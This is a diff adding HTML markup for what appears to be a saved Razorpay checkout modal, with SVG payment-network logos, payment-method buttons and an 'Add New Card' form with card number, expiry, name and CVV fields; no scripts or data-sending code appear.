+                                                                                xmlns="http://www.w3.org/2000/svg"
+                                                                                xmlns:xlink="http://www.w3.org/1999/xlink">
+                                                                                <path
+                                                                                    d="M2 7v13h18v-5H7V7H2zm0-2h5v10h15v5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2z"
+                                                                                    fill="rgba(61, 184, 245, 1)"></path>
+                                                                                <path
+                                                                                    d="M10.004 13.003a1 1 0 0 1 0-2h2a1 1 0 0 1 0 2h-2zM7 0h18a2 2 0 0 1 2 2v13a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2zm0 2v13h18V2H7zm-.282 5.005a1 1 0 1 1 0-2h19a1 1 0 0 1 0 2h-19z"
+                                                                                    fill="rgba(36, 107, 143, 1)"></path>
+                                                                            </svg></i>
+                                                                        <div class="svelte-1r0bvhf">
+                                                                            <div class="title svelte-1r0bvhf">
+                                                                                <div slot="title"
+                                                                                    class="svelte-9f98o6 title-one-cc">
+                                                                                    Card</div>
+                                                                                <div slot="label"
+                                                                                    class="no-cost-label svelte-9f98o6">
+                                                                                </div>
+                                                                            </div>
+                                                                            <div slot="subtitle"
+                                                                                class="svelte-9f98o6 subtitle-one-cc">
+                                                                                <div class="app-stack svelte-5bo389">
+                                                                                    <div
+                                                                                        class="app-tile-stack-row svelte-5bo389">
+                                                                                        <i
+                                                                                            class="app-stack-circle-icon svelte-5bo389">
+                                                                                            <svg viewBox="0 0 100 33"
+                                                                                                fill="none"
+                                                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                                                <path
+                                                                                                    d="M51.718 10.55c-.057 4.597 4.008 7.162 7.071 8.687 3.147 1.565 4.204 2.569 4.192 3.968-.024 2.142-2.51 3.087-4.837 3.124-4.06.064-6.42-1.12-8.297-2.016l-1.462 6.993c1.882.887 5.369 1.66 8.984 1.694 8.486 0 14.038-4.28 14.068-10.918.033-8.424-11.402-8.89-11.323-12.655.027-1.142 1.093-2.36 3.429-2.67 1.156-.156 4.348-.276 7.966 1.427l1.42-6.766C70.985.694 68.483 0 65.37 0c-7.99 0-13.608 4.339-13.653 10.55ZM86.578.583c-1.55 0-2.856.924-3.439 2.341L71.017 32.503h8.48l1.687-4.766h10.363l.979 4.766H100L93.478.583h-6.9Zm1.185 8.623 2.448 11.986h-6.703l4.255-11.986ZM41.436.583l-6.684 31.92h8.08L49.513.583h-8.077Zm-11.954 0L21.07 22.309 17.669 3.836c-.4-2.062-1.976-3.253-3.727-3.253H.192L0 1.51c2.823.626 6.03 1.635 7.972 2.716 1.19.66 1.529 1.236 1.92 2.804l6.443 25.473h8.54L37.968.583h-8.486Z"
+                                                                                                    fill="#1334CB">
+                                                                                                </path>
+                                                                                            </svg></i></div>
+                                                                                    <div
+                                                                                        class="app-tile-stack-row svelte-5bo389">
+                                                                                        <i
+                                                                                            class="app-stack-circle-icon svelte-5bo389">
+                                                                                            <svg xmlns="http://www.w3.org/2000/svg"
+                                                                                                viewBox="0 0 131.4 86.9">
+                                                                                                <defs>
+                                                                                                    <style>
+                                                                                                        .e {
+                                                                                                            fill: #f79e1b
+                                                                                                        }
+                                                                                                    </style>
+                                                                                                </defs>
+                                                                                                <path fill="#ff5f00"
+                                                                                                    d="M48.4 15.1H83.1V71.7H48.4z">
+                                                                                                </path>
+                                                                                                <path
+                                                                                                    d="M51.94,43.45a35.94,35.94,0,0,1,13.75-28.3,36,36,0,1,0,0,56.61A35.94,35.94,0,0,1,51.94,43.45Z"
+                                                                                                    fill="#eb001b">
+                                                                                                </path>
+                                                                                                <path class="e"
+                                                                                                    d="M120.5 65.76V64.6H121v-.24h-1.19v.24h.47v1.16zm2.31 0v-1.4h-.36l-.42 1-.42-1h-.36v1.4h.26V64.7l.39.91h.27l.39-.91v1.06zM123.94 43.45a36 36 0 01-58.25 28.3 36 36 0 000-56.61 36 36 0 0158.25 28.3z">
+                                                                                                </path>
+                                                                                            </svg></i></div>
+                                                                                    <div
+                                                                                        class="app-tile-stack-row svelte-5bo389">
+                                                                                        <i
+                                                                                            class="app-stack-circle-icon svelte-5bo389">
+                                                                                            <svg viewBox="0 0 295 80"
+                                                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                                                <path fill="none"
+                                                                                                    d="M-1 -1H581V401H-1z">
+                                                                                                </path>
+                                                                                                <g>
+                                                                                                    <path
+                                                                                                        d="m148.316,23.713c-2.247,6.269 -8.44,5.531 -8.44,5.531l-8.456,0.003l3.339,-12.422c0,0 5.351,0.028 8.887,0.028c4.327,0 5.898,3.437 4.67,6.86l0,0zm17.758,-5.805c1.373,-10.872 -6.912,-15.409 -17.256,-15.409l-27.178,0l-16.042,58.471l17.27,0l4.856,-18.027l13.76,0.086c-0.001,-0.003 21.307,0.9 24.59,-25.121m-98.657,0.58l15.752,0l-6.488,24.96c0,0 -1.617,5.564 3.589,5.994c4.112,0.34 7.173,-4.567 8.177,-7.893c1.317,-4.366 6.438,-23.063 6.438,-23.063l16.227,0l-12.349,42.482l-14.169,0l1.742,-6.068c0,0 -7.229,8.813 -17.969,7.758c-9.546,-0.938 -10.369,-7.862 -8.715,-16.502c0.811,-4.239 7.765,-27.668 7.765,-27.668"
+                                                                                                        fill="#2E3187">
+                                                                                                    </path>
+                                                                                                    <path
+                                                                                                        d="m180.594,52.315c-2.697,0.687 -5.97,1.057 -6.619,-1.395c-1.781,-6.719 13.947,-8.686 13.947,-8.686c0.107,6.122 -5.256,9.554 -7.328,10.081l0,0zm23.795,-12.296c2.076,-7.065 4.697,-13.758 2.586,-17.466c-3.232,-5.677 -9.078,-6.176 -17.627,-6.176c-9.444,0 -21.106,1.795 -24.908,14.355l15.728,0c0,0 1.433,-4.731 7.335,-4.433c5.225,0.264 4.938,3.859 3.014,5.845c-3.377,3.483 -12.703,1.551 -23.029,5.135c-9.023,3.13 -12.182,14.998 -10.223,19.733c1.899,4.591 5.438,5.177 10.211,5.646c7.668,0.754 13.545,-3.521 16.281,-6.028c0,2.785 0.071,4.341 0.071,4.341l16.549,0l-0.041,-1.557c0,0 -1.474,-0.391 -1.309,-2.463c0.118,-1.518 2.977,-8.815 5.362,-16.932m-159.211,-16.439c-2.233,5.173 -9.157,4.584 -9.157,4.584l-8.061,-0.037l2.943,-10.955c0,0 7.212,0.027 10.748,0.027c3.786,0 4.969,3.041 3.527,6.381zm18.321,-7.466c1.372,-10.871 -8.192,-13.615 -18.536,-13.615l-27.178,0l-16.043,58.471l17.27,0l5.392,-19.854l9.688,0.08c0,0 3.998,-0.232 4.076,3.521c0.085,4.005 -2.968,11.359 -2.77,16.251l17.742,0l-0.04,-1.557c0,0 -1.474,-0.392 -1.31,-2.464c0.068,-0.86 1.02,-3.588 2.266,-7.268c0.75,-1.621 1.884,-5.469 1.779,-8.602c-0.131,-3.91 -2.584,-5.725 -6.123,-6.995c11.03,-2.581 13.787,-17.968 13.787,-17.968m148.384,2.374l16.043,0l0,25.49l13.877,-25.49l14.726,0l-29.685,51.533c0,0 -2.756,4.322 -6.176,6.609c-2.809,1.881 -6.26,1.795 -7.314,1.871c-5.864,-0.051 -12.938,-0.066 -12.938,-0.066l3.412,-12.283l5.521,-0.01c0,0 2.525,-0.258 3.502,-1.505c0.931,-1.187 1.404,-2.374 1.404,-4.116c0.001,-2.612 -2.374,-42.033 -2.372,-42.033"
+                                                                                                        fill="#2E3187">
+                                                                                                    </path>
+                                                                                                    <path
+                                                                                                        d="m277.108,8.673l-18.523,64.434l34.673,-32.218l-16.15,-32.216"
+                                                                                                        fill="#278043">
+                                                                                                    </path>
+                                                                                                    <path
+                                                                                                        d="m265.234,8.673l-18.523,64.434l34.672,-32.218l-16.149,-32.216"
+                                                                                                        fill="#F06019">
+                                                                                                    </path>
+                                                                                                </g>
+                                                                                            </svg></i></div>
+                                                                                    <div
+                                                                                        class="app-tile-stack-row svelte-5bo389">
+                                                                                        <i
+                                                                                            class="app-stack-circle-icon svelte-5bo389">
+                                                                                            <svg viewBox="0 0 117 72"
+                                                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                                                <defs>
+                                                                                                    <style>
+                                                                                                        .cls-4 {
+                                                                                                            fill: #00a1df
+                                                                                                        }
+                                                                                                    </style>
+                                                                                                </defs>
+                                                                                                <path fill="none"
+                                                                                                    id="canvas_background"
+                                                                                                    d="M-1 -1H118V73H-1z">
+                                                                                                </path>
+                                                                                                <g>
+                                                                                                    <path id="svg_1"
+                                                                                                        fill="none"
+                                                                                                        d="M0 0H146.8V120.6H0z">
+                                                                                                    </path>
+                                                                                                    <g id="_Group_">
+                                                                                                        <path id="svg_3"
+                                                                                                            fill="#7673c0"
+                                                                                                            d="M42.7 7.7H74.2V64.3H42.7z">
+                                                                                                        </path>
+                                                                                                        <path
+                                                                                                            d="m44.727817,36.009162a35.94,35.94 0 0 1 13.75,-28.31a36,36 0 1 0 0,56.61a35.94,35.94 0 0 1 -13.75,-28.3z"
+                                                                                                            id="_Path_"
+                                                                                                            fill="#eb001b">
+                                                                                                        </path>
+                                                                                                        <path id="svg_4"
+                                                                                                            d="m113.287817,58.309162l0,-1.12l0.47,0l0,-0.24l-1.19,0l0,0.24l0.47,0l0,1.16l0.25,-0.04zm2.06,0.04l0,-1.4l-0.36,0l-0.42,1l-0.42,-1l-0.37,0l0,1.4l0.26,0l0,-1.05l0.39,0.91l0.27,0l0.39,-0.91l0,1.06l0.26,-0.01z"
+                                                                                                            class="cls-4">
+                                                                                                        </path>
+                                                                                                        <path id="svg_5"
+                                                                                                            d="m116.717817,36.009162a36,36 0 0 1 -58.24,28.3a36,36 0 0 0 0,-56.61a36,36 0 0 1 58.25,28.3l-0.01,0.01z"
+                                                                                                            class="cls-4">
+                                                                                                        </path>
+                                                                                                    </g>
+                                                                                                </g>
+                                                                                            </svg></i></div> <span
+                                                                                        class="full-width svelte-5bo389">&amp;
+                                                                                        more</span>
+                                                                                </div>
+                                                                            </div>
+                                                                            <div slot="error"></div>
+                                                                        </div>
+                                                                        <div slot="extra"></div>
+                                                                    </div>
+                                                                </button><button type="button"
+                                                                    class="new-method has-tooltip false svelte-1r0bvhf"
+                                                                    role="listitem" method="upi">
+                                                                    <div class="stack svelte-by96ls vertical">
+                                                                        <div class="stack svelte-by96ls horizontal"><i
+                                                                                slot="icon" class="svelte-9f98o6"> <svg
+                                                                                    viewBox="0 0 21 24"
+                                                                                    xmlns="http://www.w3.org/2000/svg">
+                                                                                    <path
+                                                                                        d="M9.516 20.254l9.15-8.388-6.1-8.388-1.185 6.516 1.629 2.042-2.359 1.974-1.135 6.244zM12.809.412l8 11a1 1 0 0 1-.133 1.325l-12 11c-.707.648-1.831.027-1.66-.916l1.42-7.805 3.547-3.01-1.986-5.579 1.02-5.606c.157-.865 1.274-1.12 1.792-.41z"
+                                                                                        fill="rgba(61, 184, 245, 1)">
+                                                                                    </path>
+                                                                                    <path
+                                                                                        d="M5.566 3.479l-3.05 16.775 9.147-8.388-6.097-8.387zM5.809.412l7.997 11a1 1 0 0 1-.133 1.325l-11.997 11c-.706.648-1.831.027-1.66-.916l4-22C4.174-.044 5.292-.299 5.81.412z"
+                                                                                        fill="rgba(36, 107, 143, 1)">
+                                                                                    </path>
+                                                                                </svg></i>
+                                                                            <div class="svelte-1r0bvhf">
+                                                                                <div slot="title"
+                                                                                    class="svelte-9f98o6 title-one-cc">
+                                                                                    UPI / QR</div>
+                                                                                <div slot="subtitle"
+                                                                                    class="svelte-9f98o6 subtitle-one-cc">
+                                                                                    <div
+                                                                                        class="upi-app-stack svelte-kbe9bc">
+                                                                                        <div
+                                                                                            class="upi-app-tile-stack upi-app-tile-stack-subText svelte-kbe9bc">
+                                                                                            <div
+                                                                                                class="upi-app-tile-stack-row svelte-kbe9bc subtext">
+                                                                                                <div
+                                                                                                    class="upi-app-tile svelte-tscv9v">
+                                                                                                    <div class="app-tile circle-tile svelte-tscv9v"
+                                                                                                        data-testid="app-tile"
+                                                                                                        data-appid="google_pay">
+                                                                                                        <i
+                                                                                                            class="circle-icon svelte-tscv9v">
+                                                                                                            <img src="https://cdn.razorpay.com/app/googlepay.svg"
+                                                                                                                alt=""></i>
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div
+                                                                                                    class="upi-app-tile svelte-tscv9v">
+                                                                                                    <div class="app-tile circle-tile svelte-tscv9v"
+                                                                                                        data-testid="app-tile"
+                                                                                                        data-appid="phonepe">
+                                                                                                        <i
+                                                                                                            class="circle-icon svelte-tscv9v">
+                                                                                                            <img src="https://cdn.razorpay.com/app/phonepe.svg"
+                                                                                                                alt=""></i>
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div
+                                                                                                    class="upi-app-tile svelte-tscv9v">
+                                                                                                    <div class="app-tile circle-tile svelte-tscv9v"
+                                                                                                        data-testid="app-tile"
+                                                                                                        data-appid="paytm">
+                                                                                                        <i
+                                                                                                            class="circle-icon svelte-tscv9v">
+                                                                                                            <img src="https://cdn.razorpay.com/app/paytm.svg"
+                                                                                                                alt=""></i>
+                                                                                                    </div>
+                                                                                                </div> <span
+                                                                                                    class="full-width svelte-kbe9bc">&amp;
+                                                                                                    more</span>
+                                                                                            </div>
+                                                                                            <div
+                                                                                                class="flex svelte-kbe9bc">
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div slot="error"></div>
+                                                                            </div>
+                                                                            <div slot="extra"></div>
+                                                                        </div>
+                                                                        <div slot="row"></div>
+                                                                    </div>
+                                                                </button><button type="button"
+                                                                    class="new-method has-tooltip false svelte-1r0bvhf"
+                                                                    role="listitem" method="netbanking">
+                                                                    <div class="stack svelte-by96ls horizontal"><i
+                                                                            slot="icon" class="svelte-9f98o6"> <svg
+                                                                                viewBox="0 0 28 25" width="" height=""
+                                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                                <path
+                                                                                    d="M4 15a1 1 0 0 1 2 0v5a1 1 0 0 1-2 0v-5zm6 0a1 1 0 0 1 2 0v5a1 1 0 0 1-2 0v-5zm6 0a1 1 0 0 1 2 0v5a1 1 0 0 1-2 0v-5zM1 25a1 1 0 0 1 0-2h20a1 1 0 0 1 0 2H1zm0-13c-.978 0-1.374-1.259-.573-1.82l10-7a1 1 0 0 1 1.146 0l1.426 1L13 9l1 3H1zm3.172-2h8.814l.017-3.378L11 5.221 4.172 10z"
+                                                                                    fill="rgba(36, 107, 143, 1)"></path>
+                                                                                <path
+                                                                                    d="M20 16a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm0-2a6 6 0 1 0 0-12 6 6 0 0 0 0 12zm3.663-7H27v2h-3.338c-.162 2.156-.85 4.275-2.057 6.352l-1.21-.704c1.084-1.863 1.703-3.744 1.863-5.648H13V7h9.258c-.16-1.904-.78-3.785-1.863-5.648l1.21-.704C22.814 2.725 23.501 4.844 23.663 7zm-4.058 7.648l-1.21.704C17 12.955 16.3 10.502 16.3 8c0-2.501.701-4.955 2.095-7.352l1.21.704C18.332 3.54 17.7 5.754 17.7 8c0 2.246.632 4.46 1.905 6.648z"
+                                                                                    fill="rgba(61, 184, 245, 1)"></path>
+                                                                            </svg></i>
+                                                                        <div class="svelte-1r0bvhf">
+                                                                            <div class="title svelte-1r0bvhf">
+                                                                                <div slot="title"
+                                                                                    class="svelte-9f98o6 title-one-cc">
+                                                                                    Netbanking</div>
+                                                                                <div slot="label"
+                                                                                    class="no-cost-label svelte-9f98o6">
+                                                                                </div>
+                                                                            </div>
+                                                                            <div slot="subtitle"
+                                                                                class="svelte-9f98o6 subtitle-one-cc">
+                                                                                All Indian banks</div>
+                                                                            <div slot="error"></div>
+                                                                        </div>
+                                                                        <div slot="extra"></div>
+                                                                    </div>
+                                                                </button><button type="button"
+                                                                    class="new-method has-tooltip false svelte-1r0bvhf"
+                                                                    role="listitem" method="wallet">
+                                                                    <div class="stack svelte-by96ls horizontal"><i
+                                                                            slot="icon" class="svelte-9f98o6"> <svg
+                                                                                viewBox="0 0 25 23" width="" height=""
+                                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                                <path
+                                                                                    d="M2 7v14h19v-5h2.011v-6H21V7H2zm0-2h19a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2zm15 10a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"
+                                                                                    fill="rgba(36, 107, 143, 1)"></path>
+                                                                                <path
+                                                                                    d="M7.326 5L16 2.11V5h2V2.11c0-.643-.308-1.352-.83-1.728a2 2 0 0 0-1.802-.276L2 5h5.326zM15 12v4h8v-4h-8zm0-2h8a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-8a2 2 0 0 1-2-2v-4a2 2 0 0 1 2-2z"
+                                                                                    fill="rgba(61, 184, 245, 1)"></path>
+                                                                            </svg></i>
+                                                                        <div class="svelte-1r0bvhf">
+                                                                            <div class="title svelte-1r0bvhf">
+                                                                                <div slot="title"
+                                                                                    class="svelte-9f98o6 title-one-cc">
+                                                                                    Wallet</div>
+                                                                                <div slot="label"
+                                                                                    class="no-cost-label svelte-9f98o6">
+                                                                                </div>
+                                                                            </div>
+                                                                            <div slot="subtitle"
+                                                                                class="svelte-9f98o6 subtitle-one-cc">
+                                                                                Mobikwik &amp; more</div>
+                                                                            <div slot="error"></div>
+                                                                        </div>
+                                                                        <div slot="extra"></div>
+                                                                    </div>
+                                                                </button><button type="button"
+                                                                    class="new-method has-tooltip false svelte-1r0bvhf"
+                                                                    role="listitem" method="paylater">
+                                                                    <div class="stack svelte-by96ls horizontal"><i
+                                                                            slot="icon" class="svelte-9f98o6"> <svg
+                                                                                xmlns="http://www.w3.org/2000/svg"
+                                                                                viewBox="0 0 29 25"
+                                                                                style="margin-top: 4px;">
+                                                                                <g fill-rule="nonzero" fill="none">
+                                                                                    <path
+                                                                                        d="M24 11h-2V2H2v13h13v2H2a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h20a2 2 0 0 1 2 2v9zm-12 1a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-2a2 2 0 1 0 0-4 2 2 0 0 0 0 4zM3.596 5.669a1 1 0 1 1-.799-1.834 2.01 2.01 0 0 0 1.04-1.043 1 1 0 0 1 1.836.794 4.01 4.01 0 0 1-2.077 2.083zm16.964.01a4.01 4.01 0 0 1-2.078-2.082 1 1 0 1 1 1.836-.794c.201.466.575.84 1.04 1.043a1 1 0 1 1-.798 1.834zM3.596 11.084a4.01 4.01 0 0 1 2.077 2.083 1 1 0 0 1-1.836.794 2.01 2.01 0 0 0-1.04-1.043 1 1 0 1 1 .799-1.834z"
+                                                                                        fill="rgba(36, 107, 143, 1)">
+                                                                                    </path>
+                                                                                    <path
+                                                                                        d="M24.546 12.159a6 6 0 1 0 2.084 6.921 1 1 0 0 1 1.876.693A8.002 8.002 0 0 1 13 17a8 8 0 0 1 12.847-6.366V9.91a1 1 0 0 1 2 0v3.25a1 1 0 0 1-1 1h-3.152a1 1 0 1 1 0-2h.85zM22 14v2.91l1.628 1.312a1 1 0 1 1-1.256 1.556l-2-1.612a1 1 0 0 1-.372-.779V14a1 1 0 0 1 2 0z"
+                                                                                        fill="rgba(61, 184, 245, 1)">
+                                                                                    </path>
+                                                                                </g>
+                                                                            </svg></i>
+                                                                        <div class="svelte-1r0bvhf">
+                                                                            <div class="title svelte-1r0bvhf">
+                                                                                <div slot="title"
+                                                                                    class="svelte-9f98o6 title-one-cc">
+                                                                                    Pay Later</div>
+                                                                                <div slot="label"
+                                                                                    class="no-cost-label svelte-9f98o6">
+                                                                                </div>
+                                                                            </div>
+                                                                            <div slot="subtitle"
+                                                                                class="svelte-9f98o6 subtitle-one-cc">
+                                                                                Simpl, LazyPay, ICICI &amp; more</div>
+                                                                            <div slot="error"></div>
+                                                                        </div>
+                                                                        <div slot="extra"></div>
+                                                                    </div>
+                                                                </button></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div id="accountTab" class="account-tab svelte-1gzjpgx">
+                                                <div class="separator svelte-1gzjpgx"></div>
+                                                <div class="account-tab-container svelte-1gzjpgx">
+                                                    <div class="account-wrapper svelte-1gzjpgx no-foh">
+                                                        <div class="d-flex align-center svelte-1gzjpgx">
+                                                            <div data-test-id="account-tab-btn"
+                                                                class="account-section svelte-1gzjpgx">Account <span
+                                                                    class="account-toggle-icon svelte-1gzjpgx"> <svg
+                                                                        width="10" height="6" fill="none"
+                                                                        xmlns="http://www.w3.org/2000/svg">
+                                                                        <path
+                                                                            d="M.187 5.028 4.897.284l4.71 4.744-.688.688-4.022-4.057L.875 5.716l-.688-.688Z"
+                                                                            fill="#171a1e"></path>
+                                                                    </svg></span></div>
+                                                        </div>
+                                                        <div class="rzp-icon-section rzp-row svelte-13in3zh"><span
+                                                                class="brand-text-row brand-text-content svelte-13in3zh">
+                                                                Secured by</span> <svg width="72" height="16"
+                                                                viewBox="0 0 72 16" fill="none"
+                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                <g clip-path="url(#a)">
+                                                                    <path
+                                                                        d="M4.857 4.48 4.26 6.633l3.413-2.165-2.232 8.168 2.267.002L11.006.574"
+                                                                        fill="#3395FF"></path>
+                                                                    <path
+                                                                        d="m1.183 9.204-.939 3.433h4.647l1.901-6.985-5.609 3.552ZM17.324 6.18c-.113.414-.332.718-.659.912-.325.194-.782.291-1.372.291H13.42l.658-2.406h1.874c.59 0 .994.097 1.214.293.22.197.272.498.16.914V6.18Zm1.94-.048c.24-.869.14-1.537-.295-2.005-.436-.464-1.2-.698-2.29-.698h-4.183l-2.518 9.212h2.032l1.015-3.713h1.333c.299 0 .534.048.706.14.173.097.274.264.305.506l.363 3.067h2.177l-.353-2.86c-.072-.638-.37-1.013-.894-1.124.668-.19 1.227-.505 1.677-.944.448-.434.768-.98.926-1.578v-.003Zm4.94 3.211c-.17.624-.431 1.096-.785 1.426-.353.33-.776.494-1.269.494-.502 0-.842-.16-1.022-.483-.18-.323-.186-.79-.019-1.403s.434-1.092.801-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .83.167 1 .499.174.333.178.81.007 1.43l-.003-.008Zm.89-3.26-.254.932a1.481 1.481 0 0 0-.638-.802c-.316-.196-.706-.297-1.172-.297a3.37 3.37 0 0 0-1.647.435c-.526.29-.988.698-1.382 1.225a5.343 5.343 0 0 0-.867 1.797c-.182.676-.22 1.266-.11 1.779.113.516.352.91.72 1.184.37.279.844.416 1.423.416.46.002.915-.095 1.333-.286.412-.183.78-.451 1.075-.787l-.265.971h1.965l1.794-6.563H25.1l-.005-.003Zm9.036 0h-5.714l-.4 1.463h3.326l-4.396 3.724-.376 1.374h5.899l.4-1.463h-3.563l4.463-3.78.361-1.317Zm5.03 3.25c-.176.645-.439 1.131-.785 1.447a1.79 1.79 0 0 1-1.259.48c-1.03 0-1.368-.643-1.017-1.928.174-.638.438-1.118.79-1.442a1.821 1.821 0 0 1 1.28-.486c.493 0 .825.16.996.484.171.323.17.805-.005 1.444Zm1.15-3.003c-.452-.276-1.03-.414-1.733-.414-.713 0-1.373.137-1.98.412a4.271 4.271 0 0 0-1.553 1.19 4.777 4.777 0 0 0-.925 1.812c-.185.688-.208 1.293-.064 1.81.144.516.447.913.901 1.188.458.277 1.041.415 1.757.415a4.65 4.65 0 0 0 1.961-.415 4.315 4.315 0 0 0 1.545-1.192 4.79 4.79 0 0 0 .924-1.812c.19-.69.212-1.294.068-1.812a1.97 1.97 0 0 0-.894-1.19l-.006.008Zm7.016 1.507.503-1.786c-.17-.086-.394-.13-.674-.13a2.82 2.82 0 0 0-2.219 1.115l.262-.961-.57.002h-1.402l-1.806 6.56h1.993l.937-3.43c.136-.498.382-.89.736-1.169.352-.28.791-.42 1.321-.42.326 0 .629.074.916.22l.003-.001Zm5.544 1.527c-.17.612-.428 1.08-.78 1.403a1.808 1.808 0 0 1-1.268.487c-.492 0-.83-.164-1.007-.49-.182-.329-.186-.802-.015-1.425.17-.622.431-1.099.79-1.43a1.82 1.82 0 0 1 1.277-.498c.484 0 .81.17.984.516.174.345.178.824.01 1.436h.01Zm1.385-3.023c-.37-.29-.84-.434-1.412-.434-.501 0-.979.111-1.431.336a2.97 2.97 0 0 0-1.102.919l.007-.045.334-1.043h-1.946l-.496 1.815-.015.064-2.045 7.479h1.996l1.03-3.765c.102.335.31.598.628.788.318.19.71.283 1.177.283.58 0 1.133-.137 1.657-.412.526-.275.98-.672 1.367-1.184a5.19 5.19 0 0 0 .855-1.779c.186-.673.224-1.273.118-1.799-.108-.526-.347-.933-.716-1.221l-.006-.002Zm6.619 2.996c-.17.62-.432 1.095-.784 1.422a1.794 1.794 0 0 1-1.268.493c-.504 0-.845-.16-1.023-.483-.181-.323-.185-.79-.019-1.403.167-.613.433-1.092.8-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .825.167 1 .498.174.331.175.808.005 1.43l-.001-.002Zm.89-3.262-.255.932a1.468 1.468 0 0 0-.636-.802c-.319-.198-.709-.297-1.174-.297-.572 0-1.124.145-1.65.435a4.32 4.32 0 0 0-1.383 1.221 5.33 5.33 0 0 0-.867 1.797c-.184.675-.22 1.266-.11 1.78.111.513.35.91.72 1.185.368.275.844.414 1.423.414.466 0 .91-.095 1.333-.286a3.112 3.112 0 0 0 1.073-.788l-.265.972h1.965l1.793-6.56h-1.965l-.003-.003Zm10.217.003.001-.002h-1.207l-.108.002h-.627l-.322.438-.08.104-.033.052-2.547 3.479-.526-4.073h-2.085l1.056 6.189-2.332 3.167h2.078l.565-.785a.86.86 0 0 1 .049-.066l.659-.917.018-.026 2.951-4.103 2.487-3.453.004-.002v-.004Z"
+                                                                        fill="#0C2651"></path>
+                                                                </g>
+                                                                <defs>
+                                                                    <clipPath id="a">
+                                                                        <path fill="#fff"
+                                                                            transform="translate(.214 .537)"
+                                                                            d="M0 0h71.786v14.926H0z"></path>
+                                                                    </clipPath>
+                                                                </defs>
+                                                            </svg></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="shadow shadow-top svelte-btdjlc"></div>
+                                        <div class="shadow shadow-bottom svelte-btdjlc"></div>
+                                    </div>
+                                    <div id="form-card"
+                                        class="tab-content showable screen svelte-1unl8xe tab-content-one-cc"
+                                        style="display: none;" data-hidden="true">
+                                        <div class="screen screen-comp svelte-btdjlc redesign-v15 show-scroll">
+                                            <div class="svelte-1nxuje7 screen-one-cc">
+                                                <div style="">
+                                                    <div class="pad svelte-1vprt24" id="add-card-container">
+                                                        <div class="page-header svelte-1vprt24"><span
+                                                                class="card-title svelte-1vprt24">Add New Card</span>
+                                                            <span class="emi-plans-label svelte-1vprt24"></span></div>
+                                                        <div class="row card-fields svelte-1vprt24">
+                                                            <div class="two-third svelte-1vprt24">
+                                                                <div class="field-container svelte-15u48hd">
+                                                                    <div
+                                                                        class="elem elem-one-click-checkout add-card-fields-one-cc-wrapper svelte-18u3466 invalid mature">
+                                                                        <input
+                                                                            class="input-one-click-checkout add-card-fields-one-cc main no-focus no-blur no-validate svelte-18u3466 error-field-one-click-checkout"
+                                                                            id="card_number" type="tel"
+                                                                            name="card[number]" required=""
+                                                                            autocomplete="cc-number" placeholder=""
+                                                                            pattern=".*" tabindex="0"
+                                                                            autocapitalize="off" autocorrect="off"
+                                                                            spellcheck="false"> <label
+                                                                            class="add-card-fields-label-one-cc label-one-click-checkout svelte-18u3466 error-label-one-click-checkout">Card
+                                                                            Number</label>
+                                                                        <div
+                                                                            class="input-validation-error validation-error-one-click-checkout  svelte-18u3466">
+                                                                            Please enter a valid card number.</div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <div class="third svelte-1vprt24">
+                                                                <div
+                                                                    class="elem elem-one-click-checkout add-card-fields-one-cc-wrapper svelte-18u3466 invalid">
+                                                                    <input
+                                                                        class="input-one-click-checkout add-card-fields-one-cc main no-focus no-blur no-validate svelte-18u3466"
+                                                                        id="card_expiry" type="tel" name="card[expiry]"
+                                                                        required="" autocomplete="cc-exp" placeholder=""
+                                                                        pattern=".*" tabindex="0" autocapitalize="off"
+                                                                        autocorrect="off" spellcheck="false"
+                                                                        maxlength="7"> <label
+                                                                        class="add-card-fields-label-one-cc label-one-click-checkout svelte-18u3466">Expiry</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="row card-fields svelte-1vprt24">
+                                                            <div class="two-third svelte-1vprt24">
+                                                                <div
+                                                                    class="elem elem-one-click-checkout add-card-fields-one-cc-wrapper svelte-18u3466">
+                                                                    <input
+                                                                        class="input-one-click-checkout add-card-fields-one-cc main no-focus no-blur no-validate svelte-18u3466"
+                                                                        id="card_name" type="text" name="card[name]"
+                                                                        required="" autocomplete="cc-name"
+                                                                        placeholder=""
+                                                                        pattern="^[a-zA-Z. 0-9'-]{1,100}$" tabindex="0"
+                                                                        autocapitalize="off" autocorrect="off"
+                                                                        spellcheck="false"> <label
+                                                                        class="add-card-fields-label-one-cc label-one-click-checkout add-card-fields-label-upper-one-cc svelte-18u3466 label-upper">Card
+                                                                        Holder's name</label> </div>
+                                                            </div>
+                                                            <div class="third svelte-1vprt24">
+                                                                <div
+                                                                    class="elem elem-one-click-checkout add-card-fields-one-cc-wrapper svelte-18u3466 invalid">
+                                                                    <input
+                                                                        class="input-one-click-checkout add-card-fields-one-cc main no-focus no-blur no-validate cvv-input svelte-18u3466"
+                                                                        id="card_cvv" type="tel" name="card[cvv]"
+                                                                        inputmode="numeric" required=""
+                                                                        autocomplete="cc-csc" pattern="[0-9]{3}"
+                                                                        tabindex="0" autocapitalize="off"
+                                                                        autocorrect="off" spellcheck="false"
+                                                                        maxlength="3"> <label
+                                                                        class="add-card-fields-label-one-cc label-one-click-checkout svelte-18u3466">CVV</label>
+                                                                </div>
